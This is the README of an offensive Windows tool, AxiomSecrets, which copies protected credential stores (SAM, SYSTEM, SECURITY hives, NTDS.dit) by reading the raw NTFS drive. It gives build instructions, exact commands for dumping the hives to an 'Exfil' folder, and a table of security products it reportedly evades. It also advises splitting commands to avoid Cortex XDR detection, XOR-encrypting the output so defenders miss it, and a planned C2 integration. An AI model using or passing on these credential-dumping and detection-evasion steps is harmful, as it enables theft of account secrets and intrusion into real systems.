## AxiomSecrets

Extract protected files (like SAM/SYSTEM hives) by directly parsing the raw NTFS drive.

Gone be the ShadowCopies and other over-the-network secretsdump, read any protected file by opening a handle directly to the drive. Obviously requires admin privs.

## Evasion efficiency
| Solution              | Status         |
|-----------------------|:--------------:|
| Defender AV           |  ✅ - OK       |
| Defender for Endpoint |  ✅ - OK       |
| Symantec EDR          |  ✅ - OK       |
| Kaspersky EDR         |  ✅ - OK       |
| Sophos                |  ⚠️ - Untested |
| Trend Micro           |  ⚠️ - Untested |
| HarfangLab            |  ✅ - OK       |
| WithSecure            |  ⚠️ - Untested |
| Cortex XDR            |  ✅ - OK (special case detailed below)       |
| Sentinel ONE          |  ✅ - OK       |
| Crowdstrike Falcon    |  ✅ - OK (In lab only)       |

### Cortex XDR - Notes
While this attack appears functional for this EDR, Cortex doesn't seem to like copying ALL files at once. IMO this is more of command-line detection than behavioral.

Instead of copying all hives in one run like this:
```powershell
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SAM C:\Windows\System32\config\SYSTEM C:\Windows\System32\config\SECURITY X:\exfil
```

You should do it in 3 separate runs like this:
```powershell
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SAM X:\exfil
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SYSTEM X:\exfil
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SECURITY X:\exfil
```

This is untested with copying `NTDS.dit` on Cortex XDR. If the EDR indeed has strict command-line inspection, passing this keyword in a command line might get you flagged as well I guess.

## TODO
- Sometimes file backup crashes on misaligned clusters, leaving incomplete files. (Fixed with new library, still needs extensive testing)
- Add a Beacon Object File compilation option, to use with your favorite C2

## Building the .exe file
> [!NOTE]  
> Make sure to clone this repository including its submodule

Install build dependencies:
```bash
$ apt-get update
$ apt-get install make mingw-w64 autoconf automake autopoint libtool pkg-config
```

First, build the libfsntfs library:
```bash
$ cd libfsntfs
$ ./synclibs.sh
$ ./autogen.sh
$ ./configure --host=x86_64-w64-mingw32 --enable-winapi=yes --with-openssl=no
$ make -j12
$ cd ..
```

Build the binary:
```bash
$ make
Precompiling main.o...                            [OK]
[...]

[COMPILATION SUCCESSFUL]

$ ls AxiomSecrets.exe
-rwxr-xr-x 1 1000 users 950272 Nov  4 00:39 AxiomSecrets.exe
-rwxr-xr-x 1 1000 users  16136 Nov  4 00:39 unxor
```

## Usage
The binary takes a variadic list of arguments as input, with the last argument being the directory where to store backed up files:
```powershell
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SAM C:\Windows\System32\config\SYSTEM Z:\Exfil
[+] Validating destination folder Z:\AxiomSecrets\
[+] Processing file C:\Windows\System32\config\SAM
[+] Volume C: opened
[+] Root volume parsed
[+] Subentry Windows found
[+] Subentry System32 found
[+] Subentry config found
[+] All subdirectories have been traversed
[+] Copying file SAM
[+] Processing file C:\Windows\System32\config\SYSTEM
[+] Volume C: opened
[+] Root volume parsed
[+] Subentry Windows found
[+] Subentry System32 found
[+] Subentry config found
[+] All subdirectories have been traversed
[+] Copying file SYSTEM
[...]
```
The above command stores copies of the SAM and SYSTEM hives into an Exfil directory on the Z: drive.

## Decrypting
To avoid having security solutions flagging the creation files holding sensitive data, backups are xor-encrypted with the key 0x42.

You can decrypt the files using the `unxor` binary created during compilation:
```bash
$ ./unxor SAM.rdx SAM
$ ./unxor SYSTEM.rdx SYSTEM
$ ./unxor SECURITY.rdx SECURITY
$ ls -l
----------  1 mallo mallo    65536 Jul 18 16:22 SAM
----------  1 mallo mallo    65536 Jul 18 16:22 SECURITY
----------  1 mallo mallo 12320768 Jul 18 16:22 SYSTEM
```

## Community

Opening issues or pull requests very much welcome.
Suggestions welcome as well.

## License

This software is under GNU GPL 3.0 license (see LICENSE file).
This is a free, copyleft license that allows users to run, study, share, and modify software, provided that all distributed versions and derivatives remain open source under the same license.

